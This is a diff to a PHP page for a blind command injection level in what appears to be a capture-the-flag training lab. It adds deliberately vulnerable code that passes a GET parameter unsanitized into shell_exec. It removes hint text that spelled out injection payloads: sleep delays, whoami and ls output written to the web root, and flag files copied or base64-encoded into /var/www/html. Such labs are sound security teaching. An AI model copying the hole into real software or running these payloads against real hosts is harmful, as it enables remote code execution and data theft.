@@ -1,3 +1,35 @@
+<?php
+require_once __DIR__ . '/helpers.php';
+
+$result_message = null;
+$result_success = false;
+
+if (isset($_GET['email'])) {
+    // Initialize level-specific flag access
+    require_once 'flag_system.php';
+    get_level_flag(5);
+
+    $email   = $_GET['email'];
+
+    // Extract domain and ping it (blind — output is completely hidden)
+    $command = "ping -c 1 $(echo " . $email . " | cut -d@ -f2) > /dev/null 2>&1";
+
+    // Execute command but suppress all output for "security"
+    shell_exec($command);
+    $exit_code = shell_exec("echo $?");
+
+    // Only reveal generic success or failure
+    if (trim($exit_code) == "0") {
+        $result_message = 'Email domain is reachable';
+        $result_success = true;
+    } else {
+        $result_message = 'Email domain is not reachable';
+    }
+}
+
+$hints = get_level_hints(5);
+$_flag_result = handle_inline_flag_submit(5);
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,176 +41,85 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>👁️‍🗨️ Level 5 - Blind Command Injection</h1>
-            <p><strong>Objective:</strong> Thực hiện command injection khi không thể thấy output trực tiếp</p>
+            <h1>Level 5 - Blind Command Injection</h1>
+            <p><strong>Objective:</strong> Exploit command injection when no direct output is returned.</p>
+            <a href="index.php" class="back-btn">&larr; Back to Levels</a>
         </div>
 
-        <div class="form-container">
-            <h3>🔍 Email Validator:</h3>
-            <p>Công cụ này validate email bằng cách ping domain. Output không hiển thị vì lý do bảo mật.</p>
-            
-            <div class="code-block">Command: ping -c 1 $(echo <?php echo htmlspecialchars($_GET['email'] ?? '[EMAIL]'); ?> | cut -d@ -f2) > /dev/null 2>&1</div>
-            
-            <?php
-            if (isset($_GET['email'])) {
-                // Initialize level-specific flag access
-                require_once 'flag_system.php';
-                get_level_flag(5);
-                
-                echo '<h3>📊 Result:</h3>';
-                echo '<div class="result">';
-                
-                $email = $_GET['email'];
-                
-                // Extract domain and ping it (blind - no output shown)
-                $command = "ping -c 1 $(echo " . $email . " | cut -d@ -f2) > /dev/null 2>&1";
-                
-                // Execute command but don't show output for "security"
-                $result = shell_exec($command);
-                $exit_code = shell_exec("echo $?");
-                
-                // Only show generic success/failure
-                if (trim($exit_code) == "0") {
-                    echo '<div class="success">✅ Email domain is reachable</div>';
-                } else {
-                    echo '<div class="error">❌ Email domain is not reachable</div>';
-                }
-                
-                echo '</div>';
-            }
-            ?>
-            
-            <h3>🔧 Try Your Input:</h3>
-            <form method="get" style="margin: 20px 0;">
-                <div class="form-group">
-                    <label for="email">Email Address:</label>
-                    <input type="text" id="email" name="email" value="<?php echo htmlspecialchars($_GET['email'] ?? ''); ?>" placeholder="Enter email (e.g., user@google.com)" oninput="updateCommand()">
-                </div>
-                <button type="submit" class="btn">🚀 Validate Email</button>
-            </form>
+        <div class="challenge-layout">
+            <!-- Left: Source Code Panel -->
+            <div class="code-panel">
+                <h3>Vulnerable Source Code</h3>
+                <div class="source-code">
+                    <pre><code><span class="php-variable">$email</span> = <span class="php-variable">$_GET</span>[<span class="php-string">'email'</span>];
 
-            <div class="info-card" style="margin: 20px 0;">
-                <h3>👁️‍🗨️ Blind Injection Characteristics</h3>
-                <ul>
-                    <li><strong>No direct output:</strong> Command results are hidden</li>
-                    <li><strong>Limited feedback:</strong> Only success/failure status</li>
-                    <li><strong>Challenge:</strong> Detect injection without seeing output</li>
-                    <li><strong>Methods:</strong> Time delays, file operations, network requests</li>
-                </ul>
+<span class="php-comment">// Input embedded inside command substitution — no filter</span>
+<span class="vuln-line"><span class="php-variable">$command</span> = <span class="php-string">"ping -c 1 $(echo "</span> . <span class="php-variable">$email</span> . <span class="php-string">" | cut -d@ -f2) &gt; /dev/null 2&gt;&amp;1"</span>;</span>
+
+<span class="php-comment">// All output is silenced — completely blind</span>
+<span class="php-function">shell_exec</span>(<span class="php-variable">$command</span>);
+<span class="php-variable">$code</span> = <span class="php-function">shell_exec</span>(<span class="php-string">"echo $?"</span>);
+
+<span class="php-comment">// Only a pass / fail status is revealed</span>
+<span class="php-keyword">if</span> (<span class="php-function">trim</span>(<span class="php-variable">$code</span>) == <span class="php-string">"0"</span>) {
+    <span class="php-keyword">echo</span> <span class="php-string">'Email domain is reachable'</span>;
+} <span class="php-keyword">else</span> {
+    <span class="php-keyword">echo</span> <span class="php-string">'Email domain is not reachable'</span>;
+}</code></pre>
+                </div>
+                <div class="vuln-annotation">
+                    <strong>Vulnerability:</strong>&nbsp; <code>$email</code> is injected unsanitized inside <code>$(echo … | cut -d@ -f2)</code>. All output is redirected to <code>/dev/null</code>, making this a blind injection — detect and exfiltrate via time delays, file writes, or out-of-band channels.
+                </div>
             </div>
 
-            <div class="info-card" style="margin: 20px 0;">
-                <h3>🔍 Blind Detection Techniques</h3>
-                <ul>
-                    <li><strong>Time-based:</strong> sleep, ping with delays</li>
-                    <li><strong>File-based:</strong> Create/modify files in web directory</li>
-                    <li><strong>Network-based:</strong> DNS requests, HTTP callbacks</li>
-                    <li><strong>Error-based:</strong> Force different error conditions</li>
-                    <li><strong>Boolean-based:</strong> Conditional responses</li>
-                </ul>
-            </div>
+            <!-- Right: Challenge Panel -->
+            <div class="challenge-panel">
+                <h3>Challenge</h3>
+                <div class="panel-body">
+                    <div class="scenario">
+                        <p><strong>Scenario:</strong> An email validator pings the domain extracted from your address. Your input lands inside a command substitution with no filtering, but <strong>all output is silenced</strong> — you only see reachable / not reachable. Prove injection with a time delay, then exfiltrate the flag by writing it to a web-accessible path.</p>
+                    </div>
 
-            <div class="hint-container">
-                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
-                <div id="hint-1" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 1: Understanding Blind Injection</h4>
-                    <p><strong>Current Command:</strong> <code>ping -c 1 $(echo [EMAIL] | cut -d@ -f2) > /dev/null 2>&1</code></p>
-                    <p>📝 <strong>Test normal:</strong> <code>user@google.com</code> (should show reachable)</p>
-                    <p>📝 <strong>Test invalid:</strong> <code>user@invalid.domain</code> (should show not reachable)</p>
-                    <p>🎯 <strong>Key insight:</strong> You can only see success/failure, not actual output</p>
-                </div>
-                <div id="hint-2" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 2: Basic Injection Detection</h4>
-                    <p><strong>Concept:</strong> Inject commands that create observable side effects</p>
-                    <p>📝 <strong>Test injection:</strong> <code>user@google.com; whoami</code></p>
-                    <p>🎯 <strong>What happens:</strong> Command executes but output is hidden</p>
-                    <p><strong>Detection methods:</strong></p>
-                    <p>• Time delays to confirm execution</p>
-                    <p>• File operations in accessible directories</p>
-                    <p>• Network requests to external servers</p>
-                </div>
-                <div id="hint-3" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 3: Time-based Detection</h4>
-                    <p><strong>Concept:</strong> Use sleep command to create detectable delays</p>
-                    <p>📝 <strong>Test:</strong> <code>user@google.com; sleep 5</code></p>
-                    <p>🎯 <strong>Observation:</strong> Page should take 5+ seconds to load</p>
-                    <p><strong>Variations:</strong></p>
-                    <p>• <code>user@google.com && sleep 3</code></p>
-                    <p>• <code>user@google.com | sleep 2</code></p>
-                    <p>• <code>user@google.com; ping -c 10 127.0.0.1</code></p>
-                </div>
-                <div id="hint-4" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 4: File-based Detection</h4>
-                    <p><strong>Concept:</strong> Create files in web-accessible directories</p>
-                    <p>📝 <strong>Test:</strong> <code>user@google.com; touch /var/www/html/proof.txt</code></p>
-                    <p>🎯 <strong>Verification:</strong> Check if file exists via browser</p>
-                    <p><strong>More examples:</strong></p>
-                    <p>• <code>user@google.com; echo "injected" > /var/www/html/test.txt</code></p>
-                    <p>• <code>user@google.com; whoami > /var/www/html/user.txt</code></p>
-                    <p>• <code>user@google.com; ls -la > /var/www/html/listing.txt</code></p>
-                </div>
-                <div id="hint-5" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 5: Data Exfiltration Techniques</h4>
-                    <p><strong>Read files and save to accessible location:</strong></p>
-                    <p>📝 <strong>Copy flags:</strong> <code>user@google.com; cp /tmp/blind_flag.txt /var/www/html/</code></p>
-                    <p>📝 <strong>Base64 encode:</strong> <code>user@google.com; base64 /tmp/blind_flag.txt > /var/www/html/flag_b64.txt</code></p>
-                    <p><strong>Advanced techniques:</strong></p>
-                    <p>• <code>user@google.com; cat /tmp/blind_flag.txt | xxd > /var/www/html/flag_hex.txt</code></p>
-                    <p>• <code>user@google.com; od -c /tmp/blind_flag.txt > /var/www/html/flag_od.txt</code></p>
-                </div>
-                <div id="hint-6" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 6: Boolean-based Detection</h4>
-                    <p><strong>Concept:</strong> Use conditional commands to test conditions</p>
-                    <p>📝 <strong>File existence test:</strong> <code>user@google.com && [ -f /tmp/blind_flag.txt ] && sleep 5</code></p>
-                    <p>🎯 <strong>Logic:</strong> Sleep only if file exists</p>
-                    <p><strong>Content testing:</strong></p>
-                    <p>• <code>user@google.com && grep -q "FLAG" /tmp/blind_flag.txt && sleep 3</code></p>
-                    <p>• <code>user@google.com && [ $(wc -l < /tmp/blind_flag.txt) -eq 1 ] && sleep 2</code></p>
-                </div>
-                <div id="hint-7" class="hint-box" style="display: none;">
-                    <h4>🎯 Hint 7: Extract the Flag!</h4>
-                    <p><strong>🚀 Target file:</strong> <code>/tmp/level5_flag.txt</code></p>
-                    <p><strong>Method 1 (Direct copy):</strong> <code>user@google.com; cp /tmp/level5_flag.txt /var/www/html/</code></p>
-                    <p><strong>Method 2 (Redirect):</strong> <code>user@google.com; cat /tmp/level5_flag.txt > /var/www/html/flag.txt</code></p>
-                    <p><strong>Method 3 (Base64):</strong> <code>user@google.com; base64 /tmp/level5_flag.txt > /var/www/html/encoded.txt</code></p>
-                    <p><strong>🔍 Access your extracted file:</strong></p>
-                    <p>After successful injection, visit: <code>http://localhost:8080/level5_flag.txt</code></p>
-                    <p><strong>💡 Verification first:</strong> <code>user@google.com; echo "test" > /var/www/html/test.txt</code></p>
+                    <div class="code-block">Command: ping -c 1 $(echo <?php echo htmlspecialchars($_GET['email'] ?? '[EMAIL]'); ?> | cut -d@ -f2) &gt; /dev/null 2&gt;&amp;1</div>
+
+                    <?php if ($result_message !== null): ?>
+                        <?php if ($result_success): ?>
+                            <div class="message success"><?php echo htmlspecialchars($result_message); ?></div>
+                        <?php else: ?>
+                            <div class="error"><?php echo htmlspecialchars($result_message); ?></div>
+                        <?php endif; ?>
+                    <?php endif; ?>
+
+                    <form method="get">
+                        <div class="form-group">
+                            <label for="email">Email Address:</label>
+                            <input type="text" id="email" name="email"
+                                   value="<?php echo htmlspecialchars($_GET['email'] ?? ''); ?>"
+                                   placeholder="Enter email (e.g., user@google.com)"
+                                   oninput="updateCommand(this.value)">
+                        </div>
+                        <button type="submit" class="btn">Validate Email</button>
+                    </form>
                 </div>
             </div>
         </div>
-        
+
+        <?= render_hint_section($hints) ?>
+
+        <?= render_inline_flag_form(5, $_flag_result) ?>
+
         <div class="navigation">
-            <a href="level4.php">⬅️ Previous Level</a>
-            <a href="index.php">🏠 Home</a>
-            <a href="level6.php">➡️ Next Level</a>
-            <a href="submit.php?level=5">🏆 Submit Flag</a>
+            <a href="level4.php">Previous Level</a>
+            <a href="index.php">Home</a>
+            <a href="level6.php">Next Level</a>
+            <a href="submit.php?level=5">Submit Flag</a>
         </div>
     </div>
 
     <script>
-    let currentHint = 0;
-    const maxHints = 7;
-
-    function updateCommand() {
-        const input = document.getElementById('email').value;
-        const codeBlock = document.querySelector('.code-block');
-        codeBlock.innerHTML = 'Command: ping -c 1 $(echo ' + (input || '[EMAIL]') + ' | cut -d@ -f2) > /dev/null 2>&1';
-    }
-
-    function showNextHint() {
-        if (currentHint < maxHints) {
-            currentHint++;
-            document.getElementById('hint-' + currentHint).style.display = 'block';
-            
-            if (currentHint >= maxHints) {
-                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
-                document.querySelector('.hint-btn').disabled = true;
-                document.querySelector('.hint-btn').style.opacity = '0.6';
-            } else {
-                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
-            }
-        }
+    function updateCommand(val) {
+        document.querySelector('.code-block').textContent =
+            'Command: ping -c 1 $(echo ' + (val || '[EMAIL]') + ' | cut -d@ -f2) > /dev/null 2>&1';
     }
     </script>
 </body>
